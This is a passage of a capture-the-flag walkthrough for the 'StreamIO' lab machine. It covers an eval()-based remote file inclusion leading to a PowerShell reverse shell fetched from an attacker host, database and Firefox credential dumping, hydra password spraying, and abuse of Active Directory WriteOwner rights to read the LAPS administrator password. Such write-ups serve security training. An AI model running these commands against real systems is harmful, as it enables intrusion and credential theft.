ksIGFycmF5KCJTY3JvbGxhYmxlIj0+ImJ1ZmZlcmVkIikpOw0Kd2hpbGUoJHJvdyA9IHNxbHNydl9mZXRjaF9hcnJheSgkcmVzLCBTUUxTUlZfRkVUQ0hfQVNTT0MpKQ0Kew0KPz4NCg0KPGRpdj4NCgk8ZGl2IGNsYXNzPSJmb3JtLWNvbnRyb2wiIHN0eWxlPSJoZWlnaHQ6IDNyZW07Ij4NCgkJPGg0IHN0eWxlPSJmbG9hdDpsZWZ0OyI+PD9waHAgZWNobyAkcm93Wyd1c2VybmFtZSddOyA/PjwvaDQ+DQoJCTxkaXYgc3R5bGU9ImZsb2F0OnJpZ2h0O3BhZGRpbmctcmlnaHQ6IDI1cHg7Ij4NCgkJCTxmb3JtIG1ldGhvZD0iUE9TVCI+DQoJCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0idXNlcl9pZCIgdmFsdWU9Ijw/cGhwIGVjaG8gJHJvd1snaWQnXTsgPz4iPg0KCQkJCTxpbnB1dCB0eXBlPSJzdWJtaXQiIGNsYXNzPSJidG4gYnRuLXNtIGJ0bi1wcmltYXJ5IiB2YWx1ZT0iRGVsZXRlIj4NCgkJCTwvZm9ybT4NCgkJPC9kaXY+DQoJPC9kaXY+DQo8L2Rpdj4NCjw/cGhwDQp9ICMgd2hpbGUgZW5kDQo/Pg0KPGJyPjxocj48YnI+DQo8Zm9ybSBtZXRob2Q9IlBPU1QiPg0KPGlucHV0IG5hbWU9ImluY2x1ZGUiIGhpZGRlbj4NCjwvZm9ybT4NCjw/cGhwDQppZihpc3NldCgkX1BPU1RbJ2luY2x1ZGUnXSkpDQp7DQppZigkX1BPU1RbJ2luY2x1ZGUnXSAhPT0gImluZGV4LnBocCIgKSANCmV2YWwoZmlsZV9nZXRfY29udGVudHMoJF9QT1NUWydpbmNsdWRlJ10pKTsNCmVsc2UNCmVjaG8oIiAtLS0tIEVSUk9SIC0tLS0gIik7DQp9DQo/Pg==           </div>
        </center>
</body>
</html>
```

Take the base64 string and save it to a file. Decode it with the following command

```bash
base64 -d master.php.b64
```

In the source code notice the implementation of that 'include' POST

```php
<?php
if(isset($_POST['include']))
{
  if($_POST['include'] !== "index.php" )
    eval(file_get_contents($_POST['include']));
  else
    echo(" ---- ERROR ---- ");
}
?>
```

Everything passed to the 'include' param is passed to an eval() function and executed. This can be exploited to run arbitrary commands.

## Initial access

Generate a base64 encoded powershell reverse shell.

The following command uses a [custom script](https://github.com/n-califano/sectools/blob/main/base64_rev_shell_gen.ps1)

```powershell
pwsh base64_rev_shell_gen.ps1

cmdlet base64_rev_shell_gen.ps1 at command pipeline position 1
Supply values for the following parameters:
ip: <ATTACKER_IP>
<BASE64 OUTPUT, SNIPPED FOR BREVITY>
```

Copy the base64 shell to a php payload

```bash
cat shell.php
system("powershell -EncodedCommand <PUT_BASE64_REVSHELL_HERE>");
```

Serve the shell.php file with `python -m http.server` and listen for incoming connections

```bash
nc -lvnp 9001
listening on [any] 9001 ...
```

Trigger the exploit

```bash
curl -s -k -X POST \
  --data "include=http://<ATTACKER_IP>/shell.php" \
  "https://streamio.htb/admin/?debug=master.php" \
  -H "Cookie: PHPSESSID=99n2gokebga11oarj0cj5esa2c"
```

The server will fetch the shell.php file from the attacking machine and pass its contents to the eval() function executing the system() command.

You should get an incoming connection on the listener

```bash
nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.131] from (UNKNOWN) [10.129.34.167] 61214
whoami
streamio\yoshihide
PS C:\inetpub\streamio.htb\admin>
```

Now you have a foothold on the machine as the 'yoshihide' user.

## Lateral movement

If you list the C:\Users folder you will find two more users on the system:

- Martin
- nikk37

### Further php source enumeration

With the same trick used earlier read the content of the admin/index.php page

```bash
curl -k "https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=index.php" -H "Cookie: PHPSESSID=99n2gokebga11oarj0cj5esa2c"
```

Decode the base64 response as shown earlier.

The discovered source code contains credentials for db access

```php
$connection = array("Database"=>"STREAMIO", "UID" => "db_admin", "PWD" => 'B1@hx31234567890');
```

You already enumerated the STREAMIO db but you can use the credentials to check the existence of additionals databases.

### Db enumeration

Use the discovered credentials to list available databases

```powershell
PS C:\Users> $conn = New-Object System.Data.SqlClient.SqlConnection("Server=localhost;Database=STREAMIO;User Id=db_admin;Password='B1@hx31234567890';"); $conn.Open(); $cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT name FROM sys.databases"; $reader = $cmd.ExecuteReader(); while($reader.Read()) { $reader["name"] }
master
tempdb
model
msdb
STREAMIO
streamio_backup
```

An additional db was discovered: **streamio_backup**

List its tables

```powershell
$conn = New-Object System.Data.SqlClient.SqlConnection("Server=localhost;Database=streamio_backup;User Id=db_admin;Password='B1@hx31234567890';"); $conn.Open(); $cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT table_name FROM information_schema.tables"; $reader = $cmd.ExecuteReader(); while($reader.Read()) { $reader["table_name"] }
movies
users
```

It has the same tables of the other db, check if it has additional users.

```powershell
PS C:\Users> sqlcmd -S localhost -U db_admin -P 'B1@hx31234567890' -d streamio_backup -Q "SELECT * FROM users" -o C:\windows\temp\users.txt; type C:\windows\temp\users.txt
id          username                                           password
----------- -------------------------------------------------- --------------------------------------------------
          1 nikk37                                             389d14cb8e4e9b94b137deb1caf0612a
          2 yoshihide                                          b779ba15cedfd22a023c4d8bcf5f2332
          3 James                                              c660060492d9edcaa8332d89c99c9239
          4 Theodore                                           925e5408ecb67aea449373d668b7359e
          5 Samantha                                           083ffae904143c4796e464dac33c1f7d
          6 Lauren                                             08344b85b329d7efd611b7a7743e8a09
          7 William                                            d62be0dc82071bccc1322d64ec5b6c51
          8 Sabrina                                            f87d3c0d6c8fd686aacc6627f1f493a5
```

The table has different users and the password hash of the 'nikk37' user is found

### Access

Go to [CrackStation](http://crackstation.net) and crack nikk37's hash.

The password is **get_dem_girls2@yahoo.com**

You can use it for remote access

```bash
evil-winrm -i <TARGET_IP> -u nikk37 -p "get_dem_girls2@yahoo.com"

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\nikk37\Documents>
```

## Privilege escalation

### Firefox credentials extraction

Looking at the firefox profiles

```powershell
Directory: C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        2/22/2022   2:40 AM                bookmarkbackups
d-----        2/22/2022   2:40 AM                browser-extension-data
d-----        2/22/2022   2:41 AM                crashes
d-----        2/22/2022   2:42 AM                datareporting
d-----        2/22/2022   2:40 AM                minidumps
d-----        2/22/2022   2:42 AM                saved-telemetry-pings
d-----        2/22/2022   2:40 AM                security_state
d-----        2/22/2022   2:42 AM                sessionstore-backups
d-----        2/22/2022   2:40 AM                storage
-a----        2/22/2022   2:40 AM             24 addons.json
-a----        2/22/2022   2:42 AM           5189 addonStartup.json.lz4
-a----        2/22/2022   2:42 AM            310 AlternateServices.txt
-a----        2/22/2022   2:41 AM         229376 cert9.db
-a----        2/22/2022   2:40 AM            208 compatibility.ini
-a----        2/22/2022   2:40 AM            939 containers.json
-a----        2/22/2022   2:40 AM         229376 content-prefs.sqlite
-a----        2/22/2022   2:40 AM          98304 cookies.sqlite
-a----        2/22/2022   2:40 AM           1081 extension-preferences.json
-a----        2/22/2022   2:40 AM          43726 extensions.json
-a----        2/22/2022   2:42 AM        5242880 favicons.sqlite
-a----        2/22/2022   2:41 AM         262144 formhistory.sqlite
-a----        2/22/2022   2:40 AM            778 handlers.json
-a----        2/22/2022   2:40 AM         294912 key4.db
-a----        2/22/2022   2:41 AM           1593 logins-backup.json
-a----        2/22/2022   2:41 AM           2081 logins.json
-a----        2/22/2022   2:42 AM              0 parent.lock
-a----        2/22/2022   2:42 AM          98304 permissions.sqlite
-a----        2/22/2022   2:40 AM            506 pkcs11.txt
-a----        2/22/2022   2:42 AM        5242880 places.sqlite
-a----        2/22/2022   2:42 AM           8040 prefs.js
-a----        2/22/2022   2:42 AM            180 search.json.mozlz4
-a----        2/22/2022   2:42 AM            288 sessionCheckpoints.json
-a----        2/22/2022   2:42 AM           1853 sessionstore.jsonlz4
-a----        2/22/2022   2:40 AM             18 shield-preference-experiments.json
-a----        2/22/2022   2:42 AM            611 SiteSecurityServiceState.txt
-a----        2/22/2022   2:42 AM           4096 storage.sqlite
-a----        2/22/2022   2:40 AM             50 times.json
-a----        2/22/2022   2:40 AM          98304 webappsstore.sqlite
-a----        2/22/2022   2:42 AM            141 xulstore.json
```

Notice the logins.json and key4.db files. These files contain stored credentials and there are tools for the extraction such as [firepwd](https://github.com/lclevy/firepwd)

Clone the project repo

```bash
git clone https://github.com/lclevy/firepwd.git
Cloning into 'firepwd'...
remote: Enumerating objects: 111, done.
remote: Counting objects: 100% (31/31), done.
remote: Compressing objects: 100% (27/27), done.
remote: Total 111 (delta 15), reused 10 (delta 4), pack-reused 80 (from 1)
Receiving objects: 100% (111/111), 253.10 KiB | 1.90 MiB/s, done.
Resolving deltas: 100% (54/54), done.
```

Install dependencies

```bash
python -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

Fetch the logins.json and key4.db files from the target (you can use the evil-winrm 'download' command) and run the tool.

Make sure the files and the tool are in the same folder.

```bash
python firepwd.py
[snip]
decrypting login/password pairs
Using 3DES (32-byte key, truncated to 24)
https://slack.streamio.htb:b'admin',b'JDg0dd1s@d0p3cr3@t0r'
https://slack.streamio.htb:b'nikk37',b'n1kk1sd0p3t00:)'
https://slack.streamio.htb:b'yoshihide',b'paddpadd@12'
https://slack.streamio.htb:b'JDgodd',b'password@12'
```

The tool was able to extract four credentials.

### Password spraying

Create a 'users.txt' file with the discovered usernames and a 'passwords.txt' file with the discovered passwords.

Test all possible combinations of users and passwords from the lists using smb authentication via hydra

```bash
hydra -L users.txt -P passwords.txt "smb2://<TARGET_IP>"
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-07-24 11:20:54
[WARNING] Workgroup was not specified, using "WORKGROUP"
[DATA] max 16 tasks per 1 server, overall 16 tasks, 578 login tries (l:34/p:17), ~37 tries per task
[DATA] attacking smb2://10.129.35.22:445/
[WARNING] 10.129.35.22 might accept any credential
[445][smb2] host: 10.129.35.22   login: JDgodd   password: JDg0dd1s@d0p3cr3@t0r
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-07-24 11:21:02
```

A valid password was discovered: **login: JDgodd password: JDg0dd1s@d0p3cr3@t0r**

Notice that the password for the JDgodd system user is different from the one in the firefox password dump (https://slack.streamio.htb:b'JDgodd',b'password@12'). If you had used the credentials as they are presented in the dump, without trying all possible combinations, you would not have discovered any password.

### AD group enumeration

Enumerate the ACL of the DC object

The following commands use a [custom module](https://github.com/n-califano/sectools/blob/main/tools/windows/PSHelpers.psm1)

```powershell
*Evil-WinRM* PS C:\Users\nikk37\Documents> Import-Module .\PSHelpers.psm1
*Evil-WinRM* PS C:\Users\nikk37\Documents> Get-ADObjectAcl -Identity DC
```

If you want to run standard commands you can run

```powershell
*Evil-WinRM* PS C:\Users\nikk37\Documents> $dc = Get-ADComputer -Identity DC
*Evil-WinRM* PS C:\Users\nikk37\Documents> $acl = Get-Acl "AD:$($dc.DistinguishedName)"
*Evil-WinRM* PS C:\Users\nikk37\Documents> $acl.Access | Select-Object IdentityReference, ActiveDirectoryRights, ObjectType, InheritanceType
```

In any case in the output you will find

```powershell
[snip]
streamIO\CORE STAFF                                                                                                       ReadProperty a0ffa854-9b42-45fa-bd07-4e1a651f2610             All
streamIO\CORE STAFF                                                                                        ReadProperty, ExtendedRight a156e052-fb12-45bc-9a00-056271040d9f             All
[snip]
```

Turn those GUIDs to readable names

```powershell
*Evil-WinRM* PS C:\Users\nikk37\Documents> Resolve-AceObjectGuid -ObjectGuid "a0ffa854-9b42-45fa-bd07-4e1a651f2610"
ms-Mcs-AdmPwdExpirationTime
*Evil-WinRM* PS C:\Users\nikk37\Documents> Resolve-AceObjectGuid -ObjectGuid "a156e052-fb12-45bc-9a00-056271040d9f"
ms-Mcs-AdmPwd
```

If you want to use standard commands this is the function used for the GUID resolution

```powershell
function Resolve-AceObjectGuid
{
    param(
        [Parameter( Mandatory = $true )]
        [Guid] $ObjectGuid
    )

    $configNC = (Get-ADRootDSE).configurationNamingContext
    $schemaNC = (Get-ADRootDSE).schemaNamingContext

    $right = Get-ADObject -SearchBase "CN=Extended-Rights,$configNC" -Filter "rightsGuid -eq '$ObjectGuid'" -Properties displayName

    if( $right )
    {
        return $right.displayName
    }

    $bytes = $ObjectGuid.ToByteArray()
    $hexFilter = ($bytes | ForEach-Object { "\{0:x2}" -f $_ }) -join ''
    $attr = Get-ADObject -SearchBase $schemaNC -LDAPFilter "(schemaIDGUID=$hexFilter)" -Properties lDAPDisplayName

    if( $attr )
    {
        return $attr.lDAPDisplayName
    }

    return "Unknown GUID: $ObjectGuid"
}
```

In any case the GUIDs resolve to LAPS attributes:

- ms-Mcs-AdmPwd → stores plaintext local Administrator password
- ms-Mcs-AdmPwdExpirationTime → stores password expiration

The CORE STAFF group having ReadProperty over the ms-Mcs-AdmPwd attribute effectively means that members of that group can read the Administrator's password in clear text.

The CORE STAFF group has no members though

```powershell
net group "CORE STAFF" /domain
Group name     CORE STAFF
Comment

Members

-------------------------------------------------------------------------------
The command completed successfully.
```

Is there an accessible user who can add members to that group?

Check the group ACL

```powershell
Get-ADGroupAcl -Identity "CORE STAFF"
```

If you want to use standard commands run

```powershell
$group = Get-ADGroup -Identity "CORE STAFF"
$acl = Get-Acl -Path "AD:\$($group.DistinguishedName)"
$acl.Access | Select-Object IdentityReference, ActiveDirectoryRights, AccessControlType, ObjectType, InheritanceType
```

The output will contain

```
[snip]
IdentityReference     : streamIO\JDgodd
ActiveDirectoryRights : WriteOwner
AccessControlType     : Allow
ObjectType            : 00000000-0000-0000-0000-000000000000
InheritanceType       : None
[snip]
```

JDgodd user having WriteOwner on the group means JDgodd can manipulate the ACL to grant itself write permissions over the 'members' attribute of the group and then add itself as a member of the group

### Exploitation of the CORE STAFF group permissions via the JDgodd user

Give JDgodd user write permission over the 'member' attribute of the CORE STAFF group and add it as a new member of the group.

```powershell
Grant-ADGroupAttributeWritePermission -Group "CORE STAFF" -User "streamIO\JDgodd" -Password "JDg0dd1s@d0p3cr3@t0r" -Guid "bf9679c0-0de6-11d0-a285-00aa003049e2"
Add-NewADGroupMember -Group "CORE STAFF" -User "streamIO\JDgodd" -Password "JDg0dd1s@d0p3cr3@t0r" -NewMember "JDgodd"
```

If you want to use standard commands run

```powershell
$cred = New-Object System.Management.Automation.PSCredential("streamIO\JDgodd", (ConvertTo-SecureString "JDg0dd1s@d0p3cr3@t0r" -AsPlainText -Force))
$groupDN = (Get-ADGroup "CORE STAFF").DistinguishedName
$de = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$groupDN", "streamIO\JDgodd", "JDg0dd1s@d0p3cr3@t0r")
$sec = $de.psbase.ObjectSecurity
$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule([System.Security.Principal.NTAccount]"streamIO\JDgodd", [System.DirectoryServices.ActiveDirectoryRights]"WriteProperty", [System.Security.AccessControl.AccessControlType]"Allow", [Guid]"bf9679c0-0de6-11d0-a285-00aa003049e2", [System.DirectoryServices.ActiveDirectorySecurityInheritance]"None")
$sec.AddAccessRule($ace)
$de.psbase.CommitChanges()
Add-ADGroupMember -Identity "CORE STAFF" -Members "JDgodd" -Credential $cred
```

Check again the members of the CORE STAFF group

```powershell
*Evil-WinRM* PS C:\Users\nikk37\Documents> net group "CORE STAFF" /domain
Group name     CORE STAFF
Comment

Members

-------------------------------------------------------------------------------
JDgodd
The command completed successfully.
```

JDgodd is now member of the group.

Exploit this membership to read the Administrator's password via the ms-Mcs-AdmPwd property

```powershell
*Evil-WinRM* PS C:\Users\nikk37\Documents> Get-ADComputerProperty -User "streamIO\JDgodd" -Password "JDg0dd1s@d0p3cr3@t0r" -Computer "DC" -Property ms-Mcs-AdmPwd
2#mI1ojD0Ij+B@
```

or, with standard commands

```powershell
*Evil-WinRM* PS C:\Users\nikk37\Documents> $cred = New-Object System.Management.Automation.PSCredential("streamIO\JDgodd", (ConvertTo-SecureString "JDg0dd1s@d0p3cr3@t0r" -AsPlainText -Force))
*Evil-WinRM* PS C:\Users\nikk37\Documents> $dc = Get-ADComputer -Identity DC -Properties ms-Mcs-AdmPwd -Credential $cred
*Evil-WinRM* PS C:\Users\nikk37\Documents> $dc.'ms-Mcs-AdmPwd'
2#mI1ojD0Ij+B@
```

The password appears to be **2#mI1ojD0Ij+B@**

Try to login via winRM

```bash
evil-winrm -i <TARGET_IP> -u Administrator -p "2#mI1ojD0Ij+B@"

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
streamio\administrator
```

Got admin access.

## Lessons learned

One of the most useful rabbit holes of this box was about the granularity of Active Directory permissions.

After discovering that the JDgodd user had WriteOwner over the CORE STAFF group, I assumed JDgodd could directly manipulate group memberships and add new users.

When I tried to add a new member with Add-ADGroupMember I got a "Insufficient access rights" error.

The reason is that WriteOwner allows you to change the **owner** of an object. Ownership, in Active Directory, allows you to modify the ACL itself, not to read/write the object's actual data.

The solution was to use the ownership to manipulate the ACL in order to gain the required write permissions to manipulate group membership. Only then it was possible to actually add a new member to the group.

This serves as a reminder that AD privileges are highly atomic and specific: always pay attention to **what** you can write to.
